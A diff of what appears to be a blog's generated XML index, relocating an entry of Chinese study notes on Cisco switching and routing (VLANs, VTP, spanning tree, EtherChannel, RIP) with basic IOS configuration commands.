+<li>先配置后连线（连线后会生成环路，阻塞） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int range f0/1-2	</span><br><span class="line"># channel-group 10 mode on	//f1-2加入逻辑端口组10号</span><br><span class="line"># port-channel load-balance mothod	//设置端口负载均衡算法</span><br></pre></td></tr></table></figure>
+ 查看端口配置状态 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># show etherchannel summary</span><br></pre></td></tr></table></figure>
+<h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1></li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="路由器概述"><a href="#路由器概述" class="headerlink" title="路由器概述"></a>路由器概述</h2><ul>
+<li>基本功能<ol>
+<li>网络互连</li>
+<li>数据处理</li>
+<li>网络管理</li>
+</ol>
+</li>
+<li>分类<ol>
+<li>固定配置路由器</li>
+<li>模块化路由器</li>
+</ol>
+</li>
+<li>控制线缆<ol>
+<li>以太网线缆</li>
+<li>控制台线缆</li>
+<li>串行广域网线缆</li>
+</ol>
+</li>
+<li>常用配置方式<ol>
+<li>控制台方式</li>
+<li>Telnet方式</li>
+<li>网管工作站方式</li>
+<li>TFTP服务器方式</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><h2 id="路由器基础配置"><a href="#路由器基础配置" class="headerlink" title="路由器基础配置"></a>路由器基础配置</h2><h1 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h1></li>
+<li><h2 id="动态路由协议基础概念"><a href="#动态路由协议基础概念" class="headerlink" title="动态路由协议基础概念"></a>动态路由协议基础概念</h2><ul>
+<li>Cisco三种路由方式<ol>
+<li>静态路由：手工定义目的地和路由转发</li>
+<li>动态路由：路由器根据路由表灵活调整</li>
+<li>默认路由：当前路由表中无匹配表项时，做出的默认选择</li>
+</ol>
+</li>
+<li>动态路由优势：<ul>
+<li>灵活调整路由表，选择最优路径</li>
+<li>均衡负载（Load Sharing）</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>自治域系统</li>
+<li>路由协议分类</li>
+<li>邻居关系</li>
+<li>网络路径的度量</li>
+<li>收敛时间</li>
+</ol>
+</li>
+<li><h2 id="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"><a href="#RIP协议（典型的距离矢量路由选择算法的内部网关协议）" class="headerlink" title="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"></a>RIP协议（典型的距离矢量路由选择算法的内部网关协议）</h2><ol>
+<li>特征<ul>
+<li>距离矢量：以跳数为度量值（metric）的距离向量协议</li>
+<li>RIP基于UDP，端口520的应用层协议</li>
+<li>跳数不超过15</li>
+</ul>
+</li>
+<li>分类<ol>
+<li>RIPv1<ul>
+<li>有类路由协议</li>
+<li>没有认证功能</li>
+<li>没有手工汇总功能</li>
+<li>广播更新</li>
+</ul>
+</li>
+<li>RIPv2<ul>
+<li><strong>无类路由协议</strong>（不规则IP地址，如10.xx.xx.xx 255.255.255.0）</li>
+<li>支持明文和MD5认证功能</li>
+<li>可在关闭自动汇总功能前提下，进行手工汇总</li>
+<li>组播更新</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>RIP配置<ul>
+<li>配置步骤：<ol>
+<li>配置路由器接口ip</li>
+<li>配置路由RIP</li>
+<li>DHCP服务配置</li>
+<li>测试 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">启用</span><br><span class="line"><span class="section"># router rip	</span></span><br><span class="line">查看路由表</span><br><span class="line">添加网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">删除网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">将版本改为RIPv2</span><br><span class="line"><span class="section"># version 2</span></span><br><span class="line"><span class="section"># no auto-summary</span></span><br><span class="line"><span class="section"># show ip router  </span></span><br><span class="line"><span class="code">	&gt; R	192.168.xx.0/24[120/?] </span></span><br><span class="line"><span class="code">		1. ？: 标识RIP传递跳数) </span></span><br><span class="line"><span class="code">		2. 120：管理距离</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="OSPF路由协议"><a href="#OSPF路由协议" class="headerlink" title="OSPF路由协议"></a>OSPF路由协议</h2></li>
+<li><h2 id="EIGRP协议"><a href="#EIGRP协议" class="headerlink" title="EIGRP协议"></a>EIGRP协议</h2></li>
+<li><h2 id="路由重发布"><a href="#路由重发布" class="headerlink" title="路由重发布"></a>路由重发布</h2></li>
+</ol>
+]]></content>
+      <categories>
+        <category>路由与交换</category>
+      </categories>
+      <tags>
+        <tag>交换机</tag>
+        <tag>路由器</tag>
       </tags>
   </entry>
   <entry>
@@ -4089,348 +4431,6 @@
       <tags>
         <tag>算法</tag>
         <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SWITCH &amp; ROUTER</title>
-    <url>/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><ol>
-<li>交换机switch的基本功能<ol>
-<li>学习功能</li>
-<li>转发&#x2F;过滤</li>
-<li>支持冗余链路</li>
-<li>对VLAN（虚拟局域网）的支持</li>
-</ol>
-</li>
-<li>二层结构交换机特点：数据链路层，无三层口，需要虚拟接口vlan（vlan 1为默认管理接口，默认所有端口都在vlan1） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch&gt;enable </span><br><span class="line">Switch#configure terminal</span><br><span class="line">SwitchA (config-if)# no shutdown  	//开启</span><br></pre></td></tr></table></figure></li>
-<li>交换机分类：<ol>
-<li>按架构特点<br> a. 机架式、带扩展槽固定配置式、不带扩展槽固定配置式</li>
-<li>按应用规模</li>
-<li>按传输介质和传输速度</li>
-<li>按OSI的分层结构</li>
-</ol>
-</li>
-<li>二层交换机工作原理<ol>
-<li>根据收到数据帧总的源mac建立地址同交换机端口的映射，并将其写入mac地址表中</li>
-<li>交换机根据数据帧中的mac地址同已建立的mac地址表比较，在决定由哪个端口转发<ol>
-<li>目的mac地址不在mac表中，则向所有端口转发（广播）</li>
-<li>广播帧和组播帧向所有的端口转发</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>交换机交换方式：<ol>
-<li>直通</li>
-<li>存储转发</li>
-<li>碎片隔离</li>
-</ol>
-</li>
-<li>交换机的级联和堆叠<ol>
-<li>级联『分开配置』<ol>
-<li>使用Uplink端口级联</li>
-<li>使用普通端口级联</li>
-</ol>
-</li>
-<li>堆叠『总体配置』<ol>
-<li>菊花链式堆叠（类似：RAID冗余磁盘阵列）</li>
-<li>星型堆叠</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>交换机管理模式<ol>
-<li>超级终端管理模式<ul>
-<li>console口链接交换机（配置线DB9-to-DB9）</li>
-<li>波特率9600，数据位8</li>
-</ul>
-</li>
-<li>Telnet管理模式<ol>
-<li>相关配置 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">switchA(config)<span class="meta"># <span class="keyword">line</span> vty 0 4  <span class="comment">// 指同时允许5个虚拟终端登陆进行配置</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># password pwd1   <span class="comment">//password</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># login  <span class="comment">//启用密码认证，默认关闭</span></span></span><br></pre></td></tr></table></figure></li>
-<li>配置登录密码： <figure class="highlight c"><figcaption><span>isco</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 1 0 pwd1  </span></span><br><span class="line"><span class="comment">// secret：MD5加密；</span></span><br><span class="line"><span class="comment">// level：指定密码用于哪个级别；</span></span><br><span class="line"><span class="comment">// 1：用户模式；</span></span><br><span class="line"><span class="comment">// 0：即将输入初始密码（5：cisco的MD5值）</span></span><br></pre></td></tr></table></figure></li>
-<li>配置特权模式口令 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 14 0 pwd2</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li>Web管理模式<h1 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h1></li>
-</ol>
-</li>
-<li><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><ol>
-<li>vlan的优点<ol>
-<li>限制网络上的广播，有助于控制流量</li>
-<li>降低成本</li>
-<li>简化网络管理，提高网络连接灵活性</li>
-<li>增强局域网安全性</li>
-</ol>
-</li>
-<li>Vlan划分方式类型<ol>
-<li>静态vlan：基于端口vlan，即指名各端口属于哪个vlan<ul>
-<li><pre><code>基于端口的vlan缺点
-</code></pre>
-<ol>
-<li>安全问题：物理攻击</li>
-<li>灵活性差，配置便捷性差</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>动态vlan：MAC based VLAN、Subnet based VLAN、User Based VLAN</li>
-</ol>
-</li>
-<li>VLAN配置相关参数<ul>
-<li>access：主机连交换机、终端</li>
-<li>trunk：交换机互联</li>
-<li>range： 范围    </li>
-<li>PVID：（port vlan id）端口的vlanID号</li>
-</ul>
-</li>
-<li>IEEE802.1Q：<ol>
-<li>封装：将VLAN信息加入数据帧的包头，据有加标记能力的端口将会执行封装</li>
-<li>去封装：VLAN信息从数据帧头去掉，具有去封装能力的端口将会执行解封装<br> <img src="/:/d3d834ddc68a463782df866e5ee281d7" alt="64aac2f1d32778beaa3638d2943075ed.png"></li>
-</ol>
-</li>
-</ol>
-</li>
-<li><h2 id="VTP-VLAN-Trunking-Protocol-思科私有协议"><a href="#VTP-VLAN-Trunking-Protocol-思科私有协议" class="headerlink" title="VTP (VLAN Trunking Protocol 思科私有协议)"></a>VTP (VLAN Trunking Protocol 思科私有协议)</h2><ul>
-<li>VTP：VLAN中继协议 &#x2F; 虚拟局域网干道协议 （配置统一性：对VLAN进行统一管理）</li>
-<li>三种工作模式：<ol>
-<li>&#x3D;&#x3D;VTP Server&#x3D;&#x3D;：<ul>
-<li>可建删修改vlan</li>
-<li>可发送并转发相关通告信息，同步vlan配置</li>
-<li>配置保存在NVRAM</li>
-</ul>
-</li>
-<li>VTP Client ：<ul>
-<li>不可建删修改vlan</li>
-<li>但可转发通告、同步</li>
-<li>不保存配置到NVRAM</li>
-</ul>
-</li>
-<li>VTP Transparent：相当于独立的交换机，不参与vtp工作，不从vtp server学习，只拥有本设备上自维护的vlan信息</li>
-</ol>
-</li>
-</ul>
-<ol>
-<li>VTP相关操作<ol>
-<li>前置配置：trunk <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># switchport mode trunk</span><br></pre></td></tr></table></figure></li>
-<li>协议配置 <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp mode &#123;server|client|transparent&#125;	//配置vtp模式</span><br><span class="line"># vtp domain &#123;test&#125;	//配置域名，默认为空</span><br><span class="line"># vtp password &#123;cisco&#125;	//配置pwd</span><br><span class="line"># vtp version 2	//配置version</span><br></pre></td></tr></table></figure></li>
-<li>vtp裁减  <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp purning	//启用裁减，只需在server上配置</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>显示信息：<code>show vtp status</code><h1 id="网络优化-amp-安全策略"><a href="#网络优化-amp-安全策略" class="headerlink" title="网络优化 &amp; 安全策略"></a>网络优化 &amp; 安全策略</h1></li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="生成树协议（STP）"><a href="#生成树协议（STP）" class="headerlink" title="生成树协议（STP）"></a>生成树协议（STP）</h2><ul>
-<li>STA：生成树算法</li>
-<li>BPDU：桥接协议数据单元（Bridge Protocol Data Unit）「两层」<ol>
-<li>版本号 00（IEEE802.1D）；02（IEEE802.1w）</li>
-<li>Bridge ID：交换机ID &#x3D; 交换机优先级 + 交换机mac地址</li>
-<li>Root ID：桥ID最小的位根ID</li>
-<li>Root Path Cost：到达根的路径开销</li>
-<li>PortID</li>
-<li>Hello Time：定期发送BPDU的时间间隔</li>
-<li>Max-Age Time：保留对方BPDU的时间间隔</li>
-<li>Forward-Delay Time发送延迟：端口状态改变的时间间隔</li>
-</ol>
-</li>
-<li>BID：网桥ID（Bridge ID）</li>
-<li>Root Bridge：根网桥（桥ID最小）</li>
-<li>Root Ports：根端口（到达根桥最佳路径）</li>
-<li>Designated Ports：指定端口</li>
-<li>Alternated Port：可选端口（既不是指定端口也不是根端口）</li>
-</ul>
-<ol>
-<li>生成树协议端口状态<ol>
-<li>禁用(Disabled)：关闭端口</li>
-<li>阻塞(Blocking)：不能接收或传输数据，不能吧mac地址加入地址表，只接收BPDU</li>
-<li>监听(Listening)：由根端口和指定端口担任，不能转发和传输，不能mac加入地址表，只能接收或发送BPDU</li>
-<li>学习(Learning)</li>
-<li>转发(Forwarding)</li>
-</ol>
-</li>
-<li>生成树协议配置<ol>
-<li>交换机优先级</li>
-<li>端口优先级</li>
-<li>配置HelloTime</li>
-<li>配置Forward-Delay Time</li>
-<li>配置Max-AgeTime</li>
-</ol>
-<ul>
-<li>Cisco系列SpanningTree默认配置：（# spanning-tree reset）<ul>
-<li>生成树协议PVST</li>
-<li>STP启用</li>
-<li>STP Proority：32768</li>
-<li>STP port Priority：128</li>
-<li>STP port cost：根据端口速率自动判断</li>
-<li>Hello Time：2s</li>
-<li>Forward-delay Time：15s</li>
-<li>Max-age Time：20s</li>
-</ul>
-<ol>
-<li>启用生成树协议</li>
-<li>关闭生成树协议</li>
-<li>配置生成树协议类型</li>
-<li>配置交换机优先级 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># spanning-tree priority 4096</span></span><br></pre></td></tr></table></figure></li>
-<li>优先级恢复默认值</li>
-<li>配置交换机端口优先级</li>
-<li>显示生成树状态</li>
-<li>显示端口生成树协议状态</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>快速生成树协议（RSTP）：生成树改进，解决收敛慢问题<ol>
-<li>改进方案<ol>
-<li>为根端口和指定端口设置了快速切换用的替换端口（Alternate Port）和备份端口（Backup Port）</li>
-<li>在只连接了两个交换端口的点对点链路中，指定端口只需与下游交换机进行一次握手就可以无时延地进入转发状态</li>
-<li>直接与终端相连而不是把其他交换机相连的端口定义为边缘端口（Edge Port）。边缘端口可以直接进入转发状态，不需要任何延时。</li>
-</ol>
-</li>
-<li>端口三种状态<ol>
-<li>Discarding</li>
-<li>Learning</li>
-<li>Forwarding</li>
-</ol>
-<ul>
-<li>对比一般生成树少了监听listening和阻塞blocking</li>
-</ul>
-</li>
-<li>基于vlan的RSTP <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># show spanning-tree vlan 20</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li>多生成树（MSTP）</li>
-</ol>
-</li>
-<li><h2 id="端口聚合（Ethernet-Channel-以太通道）"><a href="#端口聚合（Ethernet-Channel-以太通道）" class="headerlink" title="端口聚合（Ethernet Channel 以太通道）"></a>端口聚合（Ethernet Channel 以太通道）</h2><ul>
-<li>一组物理端口联合成一个逻辑通道，即通道组，此逻辑通道视作一个端口</li>
-<li>自动提供冗余和负载均衡</li>
-</ul>
-<ol>
-<li>端口聚合类型<ol>
-<li>手工静态配置</li>
-<li>动态协议聚合<ol>
-<li>PAgA（思科私有）<ul>
-<li>On：通道成员不协商，直接开启端口聚合（静态）</li>
-<li>auto：主动</li>
-<li>desirable：被动协商，不发送，只接受协商消息</li>
-<li>Off：关闭</li>
-</ul>
-</li>
-<li>LACP<ul>
-<li>active：主动</li>
-<li>passive：被动协商，不发送，只接受协商消息</li>
-<li>On</li>
-<li>Off</li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>链路聚合配置<ul>
-<li>先配置后连线（连线后会生成环路，阻塞） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int range f0/1-2	</span><br><span class="line"># channel-group 10 mode on	//f1-2加入逻辑端口组10号</span><br><span class="line"># port-channel load-balance mothod	//设置端口负载均衡算法</span><br></pre></td></tr></table></figure>
- 查看端口配置状态 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># show etherchannel summary</span><br></pre></td></tr></table></figure>
-<h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1></li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="路由器概述"><a href="#路由器概述" class="headerlink" title="路由器概述"></a>路由器概述</h2><ul>
-<li>基本功能<ol>
-<li>网络互连</li>
-<li>数据处理</li>
-<li>网络管理</li>
-</ol>
-</li>
-<li>分类<ol>
-<li>固定配置路由器</li>
-<li>模块化路由器</li>
-</ol>
-</li>
-<li>控制线缆<ol>
-<li>以太网线缆</li>
-<li>控制台线缆</li>
-<li>串行广域网线缆</li>
-</ol>
-</li>
-<li>常用配置方式<ol>
-<li>控制台方式</li>
-<li>Telnet方式</li>
-<li>网管工作站方式</li>
-<li>TFTP服务器方式</li>
-</ol>
-</li>
-</ul>
-</li>
-<li><h2 id="路由器基础配置"><a href="#路由器基础配置" class="headerlink" title="路由器基础配置"></a>路由器基础配置</h2><h1 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h1></li>
-<li><h2 id="动态路由协议基础概念"><a href="#动态路由协议基础概念" class="headerlink" title="动态路由协议基础概念"></a>动态路由协议基础概念</h2><ul>
-<li>Cisco三种路由方式<ol>
-<li>静态路由：手工定义目的地和路由转发</li>
-<li>动态路由：路由器根据路由表灵活调整</li>
-<li>默认路由：当前路由表中无匹配表项时，做出的默认选择</li>
-</ol>
-</li>
-<li>动态路由优势：<ul>
-<li>灵活调整路由表，选择最优路径</li>
-<li>均衡负载（Load Sharing）</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li>自治域系统</li>
-<li>路由协议分类</li>
-<li>邻居关系</li>
-<li>网络路径的度量</li>
-<li>收敛时间</li>
-</ol>
-</li>
-<li><h2 id="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"><a href="#RIP协议（典型的距离矢量路由选择算法的内部网关协议）" class="headerlink" title="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"></a>RIP协议（典型的距离矢量路由选择算法的内部网关协议）</h2><ol>
-<li>特征<ul>
-<li>距离矢量：以跳数为度量值（metric）的距离向量协议</li>
-<li>RIP基于UDP，端口520的应用层协议</li>
-<li>跳数不超过15</li>
-</ul>
-</li>
-<li>分类<ol>
-<li>RIPv1<ul>
-<li>有类路由协议</li>
-<li>没有认证功能</li>
-<li>没有手工汇总功能</li>
-<li>广播更新</li>
-</ul>
-</li>
-<li>RIPv2<ul>
-<li><strong>无类路由协议</strong>（不规则IP地址，如10.xx.xx.xx 255.255.255.0）</li>
-<li>支持明文和MD5认证功能</li>
-<li>可在关闭自动汇总功能前提下，进行手工汇总</li>
-<li>组播更新</li>
-</ul>
-</li>
-</ol>
-</li>
-<li>RIP配置<ul>
-<li>配置步骤：<ol>
-<li>配置路由器接口ip</li>
-<li>配置路由RIP</li>
-<li>DHCP服务配置</li>
-<li>测试 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">启用</span><br><span class="line"><span class="section"># router rip	</span></span><br><span class="line">查看路由表</span><br><span class="line">添加网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">删除网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">将版本改为RIPv2</span><br><span class="line"><span class="section"># version 2</span></span><br><span class="line"><span class="section"># no auto-summary</span></span><br><span class="line"><span class="section"># show ip router  </span></span><br><span class="line"><span class="code">	&gt; R	192.168.xx.0/24[120/?] </span></span><br><span class="line"><span class="code">		1. ？: 标识RIP传递跳数) </span></span><br><span class="line"><span class="code">		2. 120：管理距离</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="OSPF路由协议"><a href="#OSPF路由协议" class="headerlink" title="OSPF路由协议"></a>OSPF路由协议</h2></li>
-<li><h2 id="EIGRP协议"><a href="#EIGRP协议" class="headerlink" title="EIGRP协议"></a>EIGRP协议</h2></li>
-<li><h2 id="路由重发布"><a href="#路由重发布" class="headerlink" title="路由重发布"></a>路由重发布</h2></li>
-</ol>
-]]></content>
-      <categories>
-        <category>路由与交换</category>
-      </categories>
-      <tags>
-        <tag>交换机</tag>
-        <tag>路由器</tag>
       </tags>
   </entry>
   <entry>
